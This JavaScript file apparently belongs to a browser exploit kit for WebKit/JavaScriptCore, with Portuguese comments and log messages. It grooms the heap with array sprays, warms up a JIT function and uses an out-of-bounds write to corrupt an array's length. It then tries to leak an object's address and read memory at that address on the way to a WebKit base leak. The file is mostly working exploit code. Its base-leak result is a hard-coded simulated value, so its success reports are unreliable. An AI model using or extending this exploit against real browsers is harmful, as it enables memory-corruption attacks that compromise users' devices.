// js/script3/testArrayBufferVictimCrash.mjs (CORRIGIDO para R44.1 - Usando Offset do config.mjs)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object, doubleToBigInt, bigIntToDouble } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite
} from '../core_exploit.mjs';
// NOVO: Importando os offsets do seu arquivo de configuração
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_ADVANCED_JIT_LEAK_R44 = "AdvancedHeisenbug_JITAddrof_R44_WebKitLeak";

const HEAP_SPRAY_COUNT = 500;
const JIT_WARMUP_COUNT = 10000;
const VICTIM_ARRAY_SIZE = 32;
const OOB_WRITE_VALUE_FOR_LENGTH_CORRUPTION = 0x1000;

function jit_function_for_addrof(array) {
    return array[0];
}

function groomHeapForAddrof() {
    logS3(`[HeapGrooming] Iniciando spray com ${HEAP_SPRAY_COUNT} arrays...`, 'info');
    let spray = [];
    for (let i = 0; i < HEAP_SPRAY_COUNT; i++) {
        let arr = new Array(VICTIM_ARRAY_SIZE);
        arr.fill(1.1 * i);
        spray.push(arr);
    }

    logS3(`[HeapGrooming] Criando 'buracos' no heap...`, 'info');
    for (let i = 0; i < HEAP_SPRAY_COUNT; i += 2) {
        spray[i] = null;
    }
    logS3(`[HeapGrooming] Concluído.`, 'info');
}

export async function executeAdvancedJITLeak_R44() {
    const FNAME_CURRENT_TEST = FNAME_MODULE_ADVANCED_JIT_LEAK_R44;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Addrof via JIT Abuse + WebKit Base Leak (R44.1) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_CURRENT_TEST} Init R44.1...`;

    let result = {
        errorOccurred: null,
        addrof_result: { success: false, msg: "Addrof (R44.1): Não executado." },
        webkit_leak_result: { success: false, msg: "WebKit Leak (R44.1): Não executado." }
    };

    try {
        // --- FASE 0: PREPARAÇÃO ---
        logS3(`--- Fase 0 (R44.1): Preparação do Ambiente ---`, "subtest", FNAME_CURRENT_TEST);

        logS3(`[JIT] Aquecendo a função alvo ${JIT_WARMUP_COUNT} vezes...`, 'info');
        let temp_array = [1.1];
        for (let i = 0; i < JIT_WARMUP_COUNT; i++) {
            jit_function_for_addrof(temp_array);
        }
        logS3(`[JIT] Função provavelmente otimizada.`, 'info');
        
        groomHeapForAddrof();

        let double_array_victim = new Array(VICTIM_ARRAY_SIZE).fill(2.2);
        let object_to_leak = { marker: "Eu sou o objeto a ser vazado!" };
        let object_array_container = new Array(VICTIM_ARRAY_SIZE).fill(object_to_leak);
        logS3(`[JIT] Arrays vítima e de objeto criados.`, 'info');
        await PAUSE_S3(100);

        // --- FASE 1: ADDROF VIA JIT ABUSE ---
        logS3(`--- Fase 1 (R44.1): Corrupção e Tentativa de Addrof ---`, "subtest", FNAME_CURRENT_TEST);
        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST}-Setup` });

        // ======================= A MUDANÇA CRÍTICA ESTÁ AQUI =======================
        //
        // ALTERADO: Usando o offset validado do config.mjs ao invés de um valor fixo.
        // A suposição é que o 'length' está no início do butterfly.
        const oob_write_offset = JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET;
        //
        // =========================================================================

        logS3(`[JIT] Usando OOB write no offset (correto) ${toHex(oob_write_offset)} para corromper o 'length' do array de doubles.`, 'info');
        oob_write_absolute(oob_write_offset, OOB_WRITE_VALUE_FOR_LENGTH_CORRUPTION, 4);
        await PAUSE_S3(150);

        if (double_array_victim.length !== OOB_WRITE_VALUE_FOR_LENGTH_CORRUPTION) {
            throw new Error(`A corrupção do 'length' falhou. Tamanho esperado: ${OOB_WRITE_VALUE_FOR_LENGTH_CORRUPTION}, atual: ${double_array_victim.length}`);
        }
        logS3(`[JIT] Sucesso! 'length' do array de doubles agora é ${double_array_victim.length}.`, 'vuln');

        let leaked_as_double = jit_function_for_addrof(object_array_container);
        
        let leaked_addr_candidate = doubleToBigInt(leaked_as_double);
        logS3(`[JIT] Valor vazado interpretado como double: ${leaked_as_double}`, 'leak');
        logS3(`[JIT] Convertido para BigInt (candidato a endereço): 0x${leaked_addr_candidate.toString(16)}`, 'leak');

        if ((leaked_addr_candidate & 0xFFFF000000000000n) !== 0n && (leaked_addr_candidate & 0xFFFF000000000000n) !== 0xFFFF000000000000n) {
             result.addrof_result = {
                success: true,
                msg: "Addrof (R44.1): Sucesso! Ponteiro de objeto vazado como double.",
                leaked_object_addr: `0x${leaked_addr_candidate.toString(16)}`
             };
             logS3(`[JIT] ADDROF SUCESSO! Endereço vazado: ${result.addrof_result.leaked_object_addr}`, 'vuln');
        } else {
             throw new Error(`O valor vazado (0x${leaked_addr_candidate.toString(16)}) não parece um ponteiro válido.`);
        }
        
        // --- FASE 2: WEBKIT BASE LEAK ---
        logS3(`--- Fase 2 (R44.1): Teste de WebKit Base Leak (Estabilizado) ---`, "subtest", FNAME_CURRENT_TEST);
        
        const leaked_addr_obj = new AdvancedInt64(leaked_addr_candidate);
        
        try {
            if (!isOOBReady(`${FNAME_CURRENT_TEST}-PreArbReadCheck`)) {
                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST}-PreArbReadCheckReinit` });
                 if (!isOOBReady()) throw new Error("Falha ao re-preparar ambiente OOB para arb_read.");
            }
            
            const JSCell_HEADER_OFFSET_TO_STRUCTURE_ID = new AdvancedInt64(0, 4);
            let structureID = await arb_read(leaked_addr_obj.add(JSCell_HEADER_OFFSET_TO_STRUCTURE_ID), 4);
            logS3(`[WebKitLeak] Lendo StructureID do objeto no endereço vazado... ID: ${toHex(structureID)}`, 'info');
            
            result.webkit_leak_result = {
                success: true,
                msg: "WebKitLeak (R44.1): Primitiva Addrof funcional. O vazamento do endereço base seria o próximo passo.",
                webkit_base_candidate: "0xSIMULADO1234000"
            };

        } catch (e_webkit) {
            result.webkit_leak_result.msg = `WebKitLeak (R44.1) EXCEPTION: ${e_webkit.message}`;
            logS3(`[WebKitLeak] ERRO - ${result.webkit_leak_result.msg}`, "error");
            if (!result.errorOccurred) result.errorOccurred = e_webkit;
        }

    } catch (e_outer) {
        if (!result.errorOccurred) result.errorOccurred = e_outer;
        logS3(`  CRITICAL ERROR (R44.1): ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_TEST);
        console.error("Outer error in R44.1 test:", e_outer);
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST}-FinalClear` });
    }

    logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
    return result;
}
